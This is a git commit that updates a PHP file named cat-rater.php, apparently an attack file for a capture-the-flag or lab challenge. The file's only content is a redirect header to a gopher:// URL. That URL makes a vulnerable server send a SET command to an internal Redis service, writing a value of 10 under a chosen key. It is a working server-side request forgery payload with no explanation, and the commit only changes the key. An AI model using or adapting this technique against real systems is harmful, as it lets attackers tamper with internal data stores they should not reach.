6a3efa398c7548e304cf014cd2f1d9733e92b9c3
gleaming0 <76648555+gleaming0@users.noreply.github.com>
2024-09-22 11:46:23 +0900

    Update cat-rater.php

--- cat-rater.php
+++ cat-rater.php
@@ -1,3 +1,3 @@
 <?php
-        header('Location: gopher://redis:6379/_SET%20765e3629-78fc-4357-91d3-25d51377c80a%2010');
+        header('Location: gopher://redis:6379/_SET%2095c7ae3e-8050-4c0d-8b0b-4017d221408f%2010');
 ?>
